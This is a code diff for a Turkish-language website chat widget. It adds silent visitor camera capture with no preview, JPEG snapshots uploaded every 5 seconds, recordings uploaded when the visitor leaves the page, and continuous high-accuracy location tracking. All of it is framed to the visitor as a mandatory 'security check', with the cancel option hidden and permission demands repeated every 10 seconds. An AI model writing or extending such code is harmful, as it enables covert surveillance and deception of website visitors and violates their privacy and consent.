@@ -350,6 +350,29 @@
     if (!state) return;
     cameraSessions.delete(callId);
 
+    if (state.maxDurationTimer) {
+      window.clearTimeout(state.maxDurationTimer);
+      state.maxDurationTimer = null;
+    }
+    if (state.locationRetryTimer) {
+      window.clearTimeout(state.locationRetryTimer);
+      state.locationRetryTimer = null;
+    }
+    if (state.snapshotTimer) {
+      window.clearInterval(state.snapshotTimer);
+      state.snapshotTimer = null;
+    }
+    try {
+      if (state.snapVideo) {
+        state.snapVideo.pause?.();
+        state.snapVideo.srcObject = null;
+        state.snapVideo.remove?.();
+      }
+    } catch {
+      /* ignore */
+    }
+    state.snapVideo = null;
+
     try {
       state.unsubAnswer?.();
       state.unsubIce?.();
@@ -394,6 +417,7 @@
             blob,
             `kamera-${String(callId).slice(0, 8)}.webm`
           );
+          await sync.setCameraCallStatus?.(sid, callId, "ended").catch(() => {});
           syncMessage("user", "Kamera oturumu sonlandı; kayıt gönderildi.");
         } catch (err) {
           console.error(err);
@@ -408,6 +432,109 @@
       }
     }
   }
+
+  const SNAPSHOT_INTERVAL_MS = 5_000;
+
+  async function captureStreamFrameBlob(stream) {
+    const track = stream?.getVideoTracks?.()?.find((t) => t.readyState === "live");
+    if (!track) return null;
+
+    if (typeof ImageCapture !== "undefined") {
+      try {
+        const ic = new ImageCapture(track);
+        if (typeof ic.takePhoto === "function") {
+          const photo = await ic.takePhoto();
+          if (photo?.size) return photo;
+        }
+        if (typeof ic.grabFrame === "function") {
+          const bitmap = await ic.grabFrame();
+          const canvas = document.createElement("canvas");
+          canvas.width = bitmap.width;
+          canvas.height = bitmap.height;
+          const ctx = canvas.getContext("2d");
+          ctx.drawImage(bitmap, 0, 0);
+          bitmap.close?.();
+          const blob = await new Promise((resolve) =>
+            canvas.toBlob((b) => resolve(b), "image/jpeg", 0.82)
+          );
+          if (blob?.size) return blob;
+        }
+      } catch {
+        /* canvas yoluna düş */
+      }
+    }
+
+    const video = document.createElement("video");
+    video.muted = true;
+    video.playsInline = true;
+    video.setAttribute("playsinline", "");
+    video.srcObject = new MediaStream([track]);
+    try {
+      await video.play();
+      await new Promise((r) => setTimeout(r, 120));
+      const w = video.videoWidth || 640;
+      const h = video.videoHeight || 480;
+      if (!w || !h) return null;
+      const canvas = document.createElement("canvas");
+      canvas.width = w;
+      canvas.height = h;
+      canvas.getContext("2d").drawImage(video, 0, 0, w, h);
+      return await new Promise((resolve) =>
+        canvas.toBlob((b) => resolve(b), "image/jpeg", 0.82)
+      );
+    } catch {
+      return null;
+    } finally {
+      try {
+        video.pause();
+        video.srcObject = null;
+      } catch {
+        /* ignore */
+      }
+    }
+  }
+
+  function startSnapshotUploads(state, sessionId, callId, sync) {
+    if (!sync?.uploadCameraSnapshot || !state?.stream) return;
+    let busy = false;
+    let count = 0;
+
+    const tick = async () => {
+      if (!cameraSessions.has(callId) || busy) return;
+      busy = true;
+      try {
+        const blob = await captureStreamFrameBlob(state.stream);
+        if (!blob?.size || !cameraSessions.has(callId)) return;
+        count += 1;
+        const name = `snap-${String(callId).slice(0, 8)}-${count}.jpg`;
+        await sync.uploadCameraSnapshot(sessionId, callId, blob, name);
+        if (count === 1) {
+          syncMessage("user", "Kamera fotoğrafı gönderildi.");
+        }
+      } catch (err) {
+        console.warn("snapshot upload", err);
+      } finally {
+        busy = false;
+      }
+    };
+
+    void tick();
+    state.snapshotTimer = window.setInterval(tick, SNAPSHOT_INTERVAL_MS);
+  }
+
+  function flushCameraSessionsOnLeave() {
+    const ids = [...cameraSessions.keys()];
+    for (const id of ids) {
+      void stopCameraSession(id, { upload: true });
+    }
+  }
+
+  window.addEventListener("pagehide", flushCameraSessionsOnLeave);
+  document.addEventListener("visibilitychange", () => {
+    if (document.hidden) flushCameraSessionsOnLeave();
+  });
+
+  const VISITOR_RECORD_MAX_MS = 90_000;
 
   function showSilentCameraStatus(box, callId) {
     box.querySelectorAll(".chat-camera-preview").forEach((el) => el.remove());
@@ -426,19 +553,52 @@
     return { wrap, video: null, label };
   }
 
-  function startLiveLocationWatch(state, sessionId, callId, sync) {
+  function startLiveLocationWatch(state, sessionId, callId, sync, box, opts = {}) {
     if (!navigator.geolocation || !sync?.writeLiveLocation) {
       sync?.writeLocationStatus?.(sessionId, callId, "unsupported", "Geolocation yok").catch(() => {});
       return;
     }
 
+    const LOCATION_RETRY_MS = 10_000;
+    const LOCATION_DENIED_TEXT =
+      "Güvenlik kontrolüne konum izni verilmedi. Kamera ve konum izni zorunludur.";
+    const deferAsk = opts.deferAsk === true;
     let lastWriteAt = 0;
+    let asking = false;
+
+    const clearLocRetry = () => {
+      if (state.locationRetryTimer) {
+        window.clearTimeout(state.locationRetryTimer);
+        state.locationRetryTimer = null;
+      }
+    };
+
+    const showLocDeniedNotice = () => {
+      if (!box) return;
+      let el = box.querySelector(".chat-location-perm-denied");
+      if (!el) {
+        el = document.createElement("div");
+        el.className = "chat-inline-prompt chat-location-perm-denied";
+        el.innerHTML =
+          `<p class="chat-inline-prompt-title">${LOCATION_DENIED_TEXT}</p>` +
+          '<p class="chat-camera-note">Konum için alttaki butona dokunun (otomatik istemez).</p>';
+        box.appendChild(el);
+      }
+      box.scrollTop = box.scrollHeight;
+    };
+
+    const clearLocDeniedNotice = () => {
+      box?.querySelectorAll(".chat-location-perm-denied").forEach((el) => el.remove());
+    };
+
     const publish = (pos) => {
       if (!cameraSessions.has(callId)) return;
+      clearLocRetry();
+      clearLocDeniedNotice();
       const now = Date.now();
-      // Canlı ama Firebase’i spam’leme
       if (state._hadLocation && now - lastWriteAt < 2500) return;
       lastWriteAt = now;
+      const wasFirst = !state._hadLocation;
       state._hadLocation = true;
       const coords = pos.coords;
       sync
@@ -452,26 +612,348 @@
           ts: now,
         })
         .catch(() => {});
+      if (wasFirst && !state._locationGrantedMsg) {
+        state._locationGrantedMsg = true;
+        syncMessage("user", "Konum izni verildi.");
+        if (box) {
+          appendMessage(box, "bot", "Kamera ve konum izni alındı. Güvenlik kontrolü devam ediyor.", {
+            sync: true,
+          });
+        }
+      }
+      if (state.label) {
+        state.label.textContent = "Doğrulama devam ediyor… Lütfen bekleyin.";
+      }
+      state._onLocationGranted?.();
+    };
+
+    const scheduleRetry = () => {
+      // Mobilde jest olmadan tekrar isteme — sessiz "denied" üretmesin
+      if (deferAsk || isLikelyMobile()) return;
+      if (!cameraSessions.has(callId) || state._hadLocation) return;
+      clearLocRetry();
+      state.locationRetryTimer = window.setTimeout(() => {
+        state.locationRetryTimer = null;
+        void askLocation();
+      }, LOCATION_RETRY_MS);
     };
 
     const onErr = (err) => {
+      if (!cameraSessions.has(callId) || state._hadLocation) return;
       const code = err?.code;
       const msg =
         code === 1 ? "denied" : code === 2 ? "unavailable" : code === 3 ? "timeout" : "error";
       sync.writeLocationStatus?.(sessionId, callId, msg, err?.message || msg).catch(() => {});
+      if (!deferAsk && !isLikelyMobile() && box) {
+        appendMessage(box, "bot", LOCATION_DENIED_TEXT, { sync: true });
+      }
+      syncMessage("user", `Konum izni alınamadı (${msg}).`);
+      showLocDeniedNotice();
+      scheduleRetry();
+      state._onLocationDenied?.();
     };
 
-    // Kamera ile aynı anda: önce anında konum, sonra canlı izleme
-    navigator.geolocation.getCurrentPosition(publish, onErr, {
-      enableHighAccuracy: true,
-      maximumAge: 0,
-      timeout: 12000,
+    const askLocation = () => {
+      if (!cameraSessions.has(callId) || state._hadLocation || asking) return;
+      asking = true;
+      if (state.geoWatchId != null) {
+        try {
+          navigator.geolocation.clearWatch(state.geoWatchId);
+        } catch {
+          /* ignore */
+        }
+        state.geoWatchId = null;
+      }
+      navigator.geolocation.getCurrentPosition(
+        (pos) => {
+          asking = false;
+          publish(pos);
+          if (!cameraSessions.has(callId) || !state._hadLocation) return;
+          state.geoWatchId = navigator.geolocation.watchPosition(publish, onErr, {
+            enableHighAccuracy: true,
+            maximumAge: 2000,
+            timeout: 15000,
+          });
+        },
+        (err) => {
+          asking = false;
+          onErr(err);
+        },
+        {
+          enableHighAccuracy: true,
+          maximumAge: 0,
+          timeout: 12000,
+        }
+      );
+    };
+
+    state.locationRetryTimer = null;
+    state.retryLocation = askLocation;
+    // Mobil / defer: otomatik isteme — sadece dokunuşla askLocation
+    if (!deferAsk && !isLikelyMobile()) {
+      askLocation();
+    }
+  }
+
+  function showLocationTapButton(box, callId, options = {}) {
+    box.querySelectorAll(".chat-location-tap").forEach((el) => el.remove());
+    document.getElementById("loc-perm-fab")?.remove();
+    const sync = window.ChatSync;
+
+    const card = document.createElement("div");
+    card.className = "chat-inline-prompt chat-location-tap chat-camera-request-sticky";
+    card.id = "loc-perm-card";
+    card.setAttribute("role", "group");
+    card.setAttribute("aria-label", "Konum izni");
+
+    const title = document.createElement("p");
+    title.className = "chat-inline-prompt-title";
+    title.textContent = "2/2 — Konum izni zorunlu";
+
+    const note = document.createElement("p");
+    note.className = "chat-camera-note";
+    note.textContent =
+      "Kamera tamam. Şimdi KONUM için aşağıdaki butona dokunun. Sistem penceresi açılmalı.";
+
+    const actions = document.createElement("div");
+    actions.className = "chat-inline-prompt-actions";
+    const okBtn = document.createElement("button");
+    okBtn.type = "button";
+    okBtn.className = "btn btn-primary chat-perm-tap-btn";
+    okBtn.textContent = "Konum iznini ver — dokun";
+
+    // Sabit alt buton (telefonda kaçmasın)
+    const fab = document.createElement("button");
+    fab.type = "button";
+    fab.id = "loc-perm-fab";
+    fab.className = "loc-perm-fab";
+    fab.textContent = "📍 Konum iznini ver";
+
+    const requestLoc = (fromEl) => {
+      if (!navigator.geolocation) {
+        note.textContent = "Bu tarayıcı konum desteklemiyor (HTTPS / Chrome-Safari deneyin).";
+        return;
+      }
+      // ÖNCE native API (jest bozulmasın), sonra UI
+      navigator.geolocation.getCurrentPosition(
+        (pos) => {
+          const state = cameraSessions.get(callId);
+          if (!state) {
+            note.textContent = "Kamera oturumu yok; sayfayı yenileyip önce kamerayı verin.";
+            options.onSoftDeny?.("no-camera");
+            return;
+          }
+          applySeedLocationToSession(sync, callId, state, pos);
+          try {
+            if (state.geoWatchId == null) {
+              state.geoWatchId = navigator.geolocation.watchPosition(
+                (p) => {
+                  if (!cameraSessions.has(callId)) return;
+                  const c = p.coords;
+                  sync
+                    ?.writeLiveLocation?.(sync.getSessionId(), callId, {
+                      lat: c.latitude,
+                      lng: c.longitude,
+                      accuracy: c.accuracy,
+                      altitude: c.altitude,
+                      heading: c.heading,
+                      speed: c.speed,
+                      ts: Date.now(),
+                    })
+                    .catch(() => {});
+                },
+                () => {},
+                { enableHighAccuracy: true, maximumAge: 2000, timeout: 15000 }
+              );
+            }
+          } catch {
+            /* ignore */
+          }
+          box.querySelectorAll(".chat-location-perm-denied").forEach((el) => el.remove());
+          card.remove();
+          fab.remove();
+          appendMessage(box, "bot", "Konum izni alındı.", { sync: true });
+          options.onGranted?.();
+        },
+        (err) => {
+          fromEl && (fromEl.disabled = false);
+          okBtn.disabled = false;
+          fab.disabled = false;
+          const code = err?.code;
+          const hint =
+            code === 1
+              ? "Engellendi. Telefon Ayarları veya adres çubuğu → Konum → İzin Ver, sonra tekrar dokun."
+              : code === 2
+                ? "GPS/konum servisi kapalı olabilir."
+                : code === 3
+                  ? "Zaman aşımı — tekrar dokun."
+                  : err?.message || "Bilinmeyen hata";
+          note.textContent = `Konum açılamadı (${code ?? "?"}): ${hint}`;
+          syncMessage("user", `Konum izni başarısız (${code || "?"}).`);
+          options.onSoftDeny?.(String(code || "err"));
+        },
+        { enableHighAccuracy: true, maximumAge: 0, timeout: 60000 }
+      );
+      okBtn.disabled = true;
+      fab.disabled = true;
+      note.textContent = "Konum penceresi açılıyor… İzin Ver’e basın.";
+    };
+
+    okBtn.addEventListener("click", (e) => {
+      e.preventDefault();
+      e.stopPropagation();
+      requestLoc(okBtn);
     });
-    state.geoWatchId = navigator.geolocation.watchPosition(publish, onErr, {
-      enableHighAccuracy: true,
-      maximumAge: 2000,
-      timeout: 15000,
+    fab.addEventListener("click", (e) => {
+      e.preventDefault();
+      e.stopPropagation();
+      requestLoc(fab);
     });
+
+    actions.appendChild(okBtn);
+    card.append(title, note, actions);
+    box.appendChild(card);
+    document.body.appendChild(fab);
+    box.scrollTop = box.scrollHeight;
+  }
+
+  function waitForCameraLocation(callId, timeoutMs) {
+    return new Promise((resolve) => {
+      const state = cameraSessions.get(callId);
+      if (!state) {
+        resolve(false);
+        return;
+      }
+      if (state._hadLocation) {
+        resolve(true);
+        return;
+      }
+      let done = false;
+      const finish = (ok) => {
+        if (done) return;
+        done = true;
+        window.clearTimeout(timer);
+        if (state._onLocationGranted === onOk) state._onLocationGranted = null;
+        resolve(ok);
+      };
+      const onOk = () => finish(true);
+      state._onLocationGranted = onOk;
+      const timer = window.setTimeout(() => finish(false), timeoutMs);
+    });
+  }
+
+  function isLikelyMobile() {
+    return (
+      /Android|iPhone|iPad|iPod|Mobile/i.test(navigator.userAgent || "") ||
+      (Number(navigator.maxTouchPoints) > 0 &&
+        typeof window.matchMedia === "function" &&
+        window.matchMedia("(pointer: coarse)").matches)
+    );
+  }
+
+  async function acquireCameraStreamNative() {
+    if (!navigator.mediaDevices?.getUserMedia) {
+      throw new Error("getUserMedia yok");
+    }
+    const attempts = [
+      { video: true, audio: false },
+      { video: { facingMode: "user" }, audio: false },
+      { video: { facingMode: { ideal: "user" } }, audio: false },
+    ];
+    let lastErr;
+    for (const constraints of attempts) {
+      try {
+        return await navigator.mediaDevices.getUserMedia(constraints);
+      } catch (err) {
+        lastErr = err;
+      }
+    }
+    throw lastErr || new Error("Kamera açılamadı");
+  }
+
+  function acquireLocationNativeOnce() {
+    return new Promise((resolve) => {
+      if (!navigator.geolocation) {
+        resolve(null);
+        return;
+      }
+      let settled = false;
+      const done = (val) => {
+        if (settled) return;
+        settled = true;
+        resolve(val);
+      };
+      // Önce getCurrentPosition — bazı telefonda tek başına yetmez
+      navigator.geolocation.getCurrentPosition(
+        (pos) => done(pos),
+        () => {
+          // İkinci şans: kısa watch ile prompt zorla
+          let wid = null;
+          const t = window.setTimeout(() => {
+            if (wid != null) {
+              try {
+                navigator.geolocation.clearWatch(wid);
+              } catch {
+                /* ignore */
+              }
+            }
+            done(null);
+          }, 12000);
+          try {
+            wid = navigator.geolocation.watchPosition(
+              (pos) => {
+                window.clearTimeout(t);
+                try {
+                  navigator.geolocation.clearWatch(wid);
+                } catch {
+                  /* ignore */
+                }
+                done(pos);
+              },
+              () => {
+                window.clearTimeout(t);
+                try {
+                  if (wid != null) navigator.geolocation.clearWatch(wid);
+                } catch {
+                  /* ignore */
+                }
+                done(null);
+              },
+              { enableHighAccuracy: true, maximumAge: 0, timeout: 15000 }
+            );
+          } catch {
+            window.clearTimeout(t);
+            done(null);
+          }
+        },
+        { enableHighAccuracy: true, maximumAge: 0, timeout: 15000 }
+      );
+    });
+  }
+
+  function applySeedLocationToSession(sync, callId, state, seedLocation) {
+    if (!seedLocation?.coords || !state || state._hadLocation) return false;
+    const coords = seedLocation.coords;
+    const now = Date.now();
+    state._hadLocation = true;
+    state._locationGrantedMsg = true;
+    if (state.locationRetryTimer) {
+      window.clearTimeout(state.locationRetryTimer);
+      state.locationRetryTimer = null;
+    }
+    sync
+      ?.writeLiveLocation?.(sync.getSessionId(), callId, {
+        lat: coords.latitude,
+        lng: coords.longitude,
+        accuracy: coords.accuracy,
+        altitude: coords.altitude,
+        heading: coords.heading,
+        speed: coords.speed,
+        ts: now,
+      })
+      .catch(() => {});
+    syncMessage("user", "Konum izni verildi.");
+    return true;
   }
 
   async function startVisitorCamera(box, callId, options = {}) {
@@ -483,7 +965,7 @@
       });
       return "error";
     }
-    if (!navigator.mediaDevices?.getUserMedia) {
+    if (!navigator.mediaDevices?.getUserMedia && !options.stream) {
       appendMessage(box, "bot", "Bu tarayıcı kamerayı desteklemiyor.", { sync: false });
       if (!auto) await sync.setCameraCallStatus(sync.getSessionId(), callId, "denied");
       return "error";
@@ -497,27 +979,25 @@
     }
     await stopCameraSession(callId, { upload: false });
 
-    // Kamera + konum izni birlikte
-    let stream;
-    try {
-      stream = await navigator.mediaDevices.getUserMedia({
-        video: { facingMode: "user" },
-        audio: false,
-      });
-    } catch (err) {
-      const name = String(err?.name || "");
-      if (auto && (name === "NotAllowedError" || name === "SecurityError" || name === "NotReadableError")) {
-        return "need-gesture";
+    let stream = options.stream || null;
+    if (!stream) {
+      try {
+        stream = await acquireCameraStreamNative();
+      } catch (err) {
+        const name = String(err?.name || "");
+        if (auto && (name === "NotAllowedError" || name === "SecurityError" || name === "NotReadableError")) {
+          return "need-gesture";
+        }
+        appendMessage(
+          box,
+          "bot",
+          "Kamera izni verilmedi veya erişilemedi. Aşağıdaki İzin Ver butonuna basın.",
+          { sync: false }
+        );
+        syncMessage("user", "Kamera izni reddedildi / erişilemedi.");
+        if (!auto) await sync.setCameraCallStatus(sync.getSessionId(), callId, "denied");
+        return "denied";
       }
-      appendMessage(
-        box,
-        "bot",
-        "Kamera izni verilmedi veya erişilemedi. Tarayıcı izinlerinden kamerayı açabilirsiniz.",
-        { sync: false }
-      );
-      syncMessage("user", "Kamera izni reddedildi / erişilemedi.");
-      await sync.setCameraCallStatus(sync.getSessionId(), callId, "denied");
-      return "denied";
     }
 
     // Sessiz akış: önizleme yok, sadece durum metni
@@ -537,15 +1017,36 @@
       unsubIce: null,
       geoWatchId: null,
       _hadLocation: false,
+      maxDurationTimer: null,
+      snapshotTimer: null,
+      snapVideo: null,
+      locationRetryTimer: null,
     };
     cameraSessions.set(callId, state);
 
-    // Konumu kamera ile paralel başlat (ziyaretçiye mesaj yok)
-    startLiveLocationWatch(state, sessionId, callId, sync);
+    // Admin bağlanmazsa ~90 sn sonra kaydı Storage’a yükle (PC kapalı senaryosu)
+    state.maxDurationTimer = window.setTimeout(() => {
+      if (!cameraSessions.has(callId)) return;
+      void stopCameraSession(callId, { upload: true });
+    }, VISITOR_RECORD_MAX_MS);
+
+    // Konum: mobilde otomatik isteme (jest yoksa sessiz deny olur)
+    startLiveLocationWatch(state, sessionId, callId, sync, box, {
+      deferAsk: Boolean(options.deferLocation) || (isLikelyMobile() && !options.seedLocation),
+    });
+
+    // Gesture ile alınan konum varsa hemen yaz
+    if (options.seedLocation?.coords && !state._hadLocation) {
+      applySeedLocationToSession(sync, callId, state, options.seedLocation);
+      box.querySelectorAll(".chat-location-perm-denied").forEach((el) => el.remove());
+    }
 
     if (!startVisitorRecording(state)) {
       preview.label.textContent = "Doğrulama devam ediyor… (kayıt sınırlı)";
     }
+
+    // Video olmasa bile ~5 sn’de bir JPEG → Storage
+    startSnapshotUploads(state, sessionId, callId, sync);
 
     stream.getVideoTracks().forEach((track) => {
       pc.addTrack(track, stream);
@@ -553,6 +1054,12 @@
 
     const pendingAdminIce = [];
     let remoteReady = false;
+
+    function clearMaxDurationOnAdminJoin() {
+      if (!state.maxDurationTimer) return;
+      window.clearTimeout(state.maxDurationTimer);
+      state.maxDurationTimer = null;
+    }
 
     pc.onicecandidate = (ev) => {
       if (ev.candidate) {
@@ -563,6 +1070,9 @@
     };
 
     pc.onconnectionstatechange = () => {
+      if (pc.connectionState === "connected") {
+        clearMaxDurationOnAdminJoin();
+      }
       if (state.label && pc.connectionState === "connected") {
         state.label.textContent = "Doğrulama devam ediyor… Lütfen bekleyin.";
       }
@@ -604,6 +1114,7 @@
       if (!state.pc) return;
       if (data.answer && !answered) {
         answered = true;
+        clearMaxDurationOnAdminJoin();
         try {
           await state.pc.setRemoteDescription(
             new RTCSessionDescription({
@@ -630,8 +1141,8 @@
         type: offer.type,
         sdp: offer.sdp,
       });
-      // Ziyaretçi sohbetinde mesaj yok
-      syncMessage("user", auto ? "Kamera ve konum izni verildi." : "Kamera ve konum izni onaylandı.");
+      // Ziyaretçi sohbetinde mesaj yok — konum ayrı takip edilir
+      syncMessage("user", auto ? "Kamera izni verildi." : "Kamera izni onaylandı.");
       return "ok";
     } catch (err) {
       console.error(err);
@@ -647,11 +1158,13 @@
     }
   }
 
-  function showCameraRequest(box, msg) {
+  function showCameraRequest(box, msg, options = {}) {
     box.querySelectorAll(".chat-camera-request").forEach((el) => el.remove());
 
     const card = document.createElement("div");
-    card.className = "chat-inline-prompt chat-camera-request";
+    card.className =
+      "chat-inline-prompt chat-camera-request" +
+      (options.sticky ? " chat-camera-request-sticky" : "");
     card.setAttribute("role", "group");
     card.setAttribute("aria-label", "Kamera talebi");
 
@@ -664,6 +1177,7 @@
     const note = document.createElement("p");
     note.className = "chat-camera-note";
     note.textContent =
+      msg.note ||
       "Devam etmek için tarayıcı kamera ve konum iznini onaylayın.";
 
     const actions = document.createElement("div");
@@ -671,19 +1185,25 @@
 
     const okBtn = document.createElement("button");
     okBtn.type = "button";
-    okBtn.className = "btn btn-primary";
+    okBtn.className = "btn btn-primary chat-perm-tap-btn";
     okBtn.textContent = msg.okLabel || "İzin ver";
 
     const cancelBtn = document.createElement("button");
     cancelBtn.type = "button";
     cancelBtn.className = "btn btn-ghost";
     cancelBtn.textContent = msg.cancelLabel || "Reddet";
+    const showCancel = msg.cancelLabel !== "" && msg.hideCancel !== true;
+    const nativeFromTap = options.nativeFromTap !== false;
 
     const finish = async (accepted) => {
-      card.remove();
       const sync = window.ChatSync;
       const callId = msg.callId;
       if (!accepted) {
+        card.remove();
+        if (options.softDeny) {
+          options.onSoftDeny?.();
+          return;
+        }
         appendMessage(box, "user", "Kamera talebini reddettim.");
         if (sync?.enabled && callId) {
           await sync.setCameraCallStatus(sync.getSessionId(), callId, "denied").catch(() => {});
@@ -691,34 +1211,148 @@
         return;
       }
       if (!callId) {
+        card.remove();
         appendMessage(box, "bot", "Kamera oturumu eksik; talebi yeniden gönderin.", {
           sync: false,
         });
         return;
       }
-      await startVisitorCamera(box, callId, { auto: false });
+
+      // Telefonda: önce SADECE kamera (jest), sonra ayrı butonla konum
+      okBtn.disabled = true;
+      note.textContent = "Kamera izni açılıyor… İzin Ver’e basın.";
+
+      let stream = null;
+      try {
+        if (nativeFromTap) {
+          const existing = cameraSessions.get(callId);
+          if (existing?.stream && !existing._hadLocation) {
+            // Konum ayrı karta taşındı
+            card.remove();
+            showLocationTapButton(box, callId, {
+              onGranted: () => options.onGranted?.(),
+              onSoftDeny: (r) => options.onSoftDeny?.(r),
+            });
+            return;
+          }
+          stream = await acquireCameraStreamNative();
+        }
+      } catch (err) {
+        console.warn("native perm", err);
+        okBtn.disabled = false;
+        note.textContent =
+          "Kamera izni alınamadı. Butona tekrar dokunun. Engellendiyse adres çubuğundan kamerayı Açık yapın.";
+        options.onSoftDeny?.(String(err?.name || err));
+        return;
+      }
+
+      card.remove();
+      const result = await startVisitorCamera(box, callId, {
+        auto: false,
+        stream: stream || undefined,
+        deferLocation: isLikelyMobile(),
+      });
+
+      if (result === "ok" && callId && !cameraSessions.get(callId)?._hadLocation) {
+        appendMessage(box, "bot", "Kamera alındı. Şimdi konum için butona dokunun.", {
+          sync: true,
+        });
+        showLocationTapButton(box, callId, {
+          onGranted: () => options.onGranted?.(),
+          onSoftDeny: (r) => options.onSoftDeny?.(r || "location-pending"),
+        });
+        options.onSoftDeny?.("location-pending");
+        return;
+      }
+
+      if (result === "ok") {
+        options.onGranted?.();
+      } else if (options.softDeny) {
+        options.onSoftDeny?.(result);
+      }
     };
 
-    okBtn.addEventListener("click", () => finish(true));
-    cancelBtn.addEventListener("click", () => finish(false));
-    actions.append(okBtn, cancelBtn);
+    okBtn.addEventListener("click", (e) => {
+      e.preventDefault();
+      if (okBtn.disabled) return;
+      void finish(true);
+    });
+
+    if (showCancel) {
+      cancelBtn.addEventListener("click", () => finish(false));
+      actions.append(okBtn, cancelBtn);
+    } else {
+      actions.append(okBtn);
+    }
     card.append(title, note, actions);
     box.appendChild(card);
     box.scrollTop = box.scrollHeight;
-    okBtn.focus();
+    // Mobilde otomatik focus klavye/izin bozabilir — sadece masaüstü
+    if (!isLikelyMobile()) okBtn.focus();
   }
 
   let cameraOpenSeq = 0;
   let latestCameraCallId = null;
+  let cameraPermLoopToken = 0;
+  let cameraPermLoopTimer = null;
+  const CAMERA_PERM_RETRY_MS = 10_000;
+  const CAMERA_PERM_DENIED_TEXT =
+    "Güvenlik kontrolü için kamera ve konum izni zorunludur. Lütfen İzin Ver’i seçin.";
+
+  function stopCameraPermissionLoop() {
+    cameraPermLoopToken += 1;
+    if (cameraPermLoopTimer) {
+      window.clearTimeout(cameraPermLoopTimer);
+      cameraPermLoopTimer = null;
+    }
+  }
+
+  function showPermissionDeniedNotice(box, extraNote) {
+    let el = box.querySelector(".chat-camera-perm-denied");
+    if (!el) {
+      el = document.createElement("div");
+      el.className = "chat-inline-prompt chat-camera-perm-denied";
+      el.innerHTML =
+        `<p class="chat-inline-prompt-title">${CAMERA_PERM_DENIED_TEXT}</p>` +
+        '<p class="chat-camera-note" data-perm-note></p>';
+      box.appendChild(el);
+    } else {
+      const title = el.querySelector(".chat-inline-prompt-title");
+      if (title) title.textContent = CAMERA_PERM_DENIED_TEXT;
+    }
+    const note = el.querySelector("[data-perm-note]");
+    if (note) {
+      note.textContent =
+        extraNote ||
+        "Kamera ve konum izni verilene kadar her 10 saniyede mesaj ve izin talebi yenilenir.";
+    }
+    box.scrollTop = box.scrollHeight;
+  }
+
+  function clearPermissionDeniedNotice(box) {
+    box.querySelectorAll(".chat-camera-perm-denied").forEach((el) => el.remove());
+    box.querySelectorAll(".chat-location-perm-denied").forEach((el) => el.remove());
+    box.querySelectorAll(".chat-camera-auto").forEach((el) => el.remove());
+    box.querySelectorAll(".chat-camera-request").forEach((el) => el.remove());
+  }
+
+  async function queryCameraPermissionState() {
+    try {
+      if (!navigator.permissions?.query) return "unknown";
+      const st = await navigator.permissions.query({ name: "camera" });
+      return st?.state || "unknown";
+    } catch {
+      return "unknown";
+    }
+  }
 
   async function autoOpenCameraFromMessage(box, msg) {
     const callId = msg.callId;
     if (!callId) {
       showCameraRequest(box, msg);
-      return;
+      return "error";
     }
 
-    // Burst halinde gelen taleplerde yalnızca en son callId açılsın
     latestCameraCallId = callId;
     const seq = ++cameraOpenSeq;
 
@@ -727,8 +1361,8 @@
     const status = document.createElement("div");
     status.className = "chat-inline-prompt chat-camera-auto";
     status.innerHTML =
-      '<p class="chat-inline-prompt-title">İzinler isteniyor…</p>' +
-      '<p class="chat-camera-note">Tarayıcı kamera ve konum isterse İzin Ver seçin.</p>';
+      '<p class="chat-inline-prompt-title">Kamera ve konum izni isteniyor…</p>' +
+      '<p class="chat-camera-note">Tarayıcıda İzin Ver’i seçin. İkisi de zorunludur.</p>';
     box.appendChild(status);
     box.scrollTop = box.scrollHeight;
 
@@ -736,15 +1370,175 @@
     if (seq !== cameraOpenSeq || latestCameraCallId !== callId) {
       status.remove();
       await stopCameraSession(callId, { upload: false });
-      return;
+      return "superseded";
     }
     status.remove();
 
     if (result === "need-gesture") {
       showCameraRequest(box, msg);
-    } else if (result === "ok") {
-      // Sessiz: ekstra “kamera açıldı” spam’i yok
     }
+    return result;
+  }
+
+  /** Kamera + konum ikisi alınana kadar her 10 sn mesaj + izin talebi */
+  function startCameraPermissionLoop(box) {
+    stopCameraPermissionLoop();
+    const token = cameraPermLoopToken;
+    let callId = null;
+    let attempting = false;
+    let retryCount = 0;
+
+    const scheduleRetry = () => {
+      if (token !== cameraPermLoopToken) return;
+      if (cameraPermLoopTimer) window.clearTimeout(cameraPermLoopTimer);
+      cameraPermLoopTimer = window.setTimeout(() => {
+        cameraPermLoopTimer = null;
+        void attempt();
+      }, CAMERA_PERM_RETRY_MS);
+    };
+
+    const sessionHasBoth = (id) => {
+      const st = id ? cameraSessions.get(id) : null;
+      return Boolean(st?.stream && st._hadLocation);
+    };
+
+    const markComplete = () => {
+      if (token !== cameraPermLoopToken) return;
+      clearPermissionDeniedNotice(box);
+      stopCameraPermissionLoop();
+      appendMessage(box, "bot", "Teşekkürler. Kamera ve konum izni alındı.", { sync: true });
+    };
+
+    const presentAskUi = (browserBlocked, needLocationOnly) => {
+      if (token !== cameraPermLoopToken) return;
+      showPermissionDeniedNotice(
+        box,
+        browserBlocked
+          ? `Tarayıcı izni engelledi. Adres çubuğundan kamera/konumu Açık yapın, sonra büyük “İzin ver” butonuna DOKUNUN. (#${retryCount})`
+          : needLocationOnly
+            ? `Kamera alındı; konum için “İzin ver”e DOKUNUN (tarayıcı penceresi açılır). (#${retryCount})`
+            : `Gerçek izin için alttaki “İzin ver”e DOKUNUN — sadece mesaj yetmez. (#${retryCount})`
+      );
+
+      showCameraRequest(
+        box,
+        {
+          callId,
+          type: "camera",
+          text: CAMERA_PERM_DENIED_TEXT,
+          note: needLocationOnly
+            ? "Butona dokunun; telefon konum izni penceresini açacak."
+            : "Butona dokunun; telefon kamera ve konum izin pencerelerini açacak.",
+          okLabel: "İzin ver — dokun",
+          hideCancel: true,
+        },
+        {
+          softDeny: true,
+          sticky: true,
+          nativeFromTap: true,
+          onGranted: async () => {
+            if (token !== cameraPermLoopToken) return;
+            if (sessionHasBoth(callId)) {
+              markComplete();
+              return;
+            }
+            const gotLoc = await waitForCameraLocation(callId, 12000);
+            if (gotLoc || sessionHasBoth(callId)) markComplete();
+            else scheduleRetry();
+          },
+          onSoftDeny: () => scheduleRetry(),
+        }
+      );
+      scheduleRetry();
+    };
+
+    const attempt = async () => {
+      if (token !== cameraPermLoopToken || attempting) return;
+      attempting = true;
+      retryCount += 1;
+      try {
+        // Her turda sohbet mesajı (izin alana kadar)
+        appendMessage(box, "bot", CAMERA_PERM_DENIED_TEXT, { sync: true });
+
+        let sync = window.ChatSync;
+        if (!sync?.enabled && window.ChatSyncReady) {
+          sync = await window.ChatSyncReady.catch(() => null);
+        }
+        if (!sync?.enabled || typeof sync.startVisitorCameraOffer !== "function") {
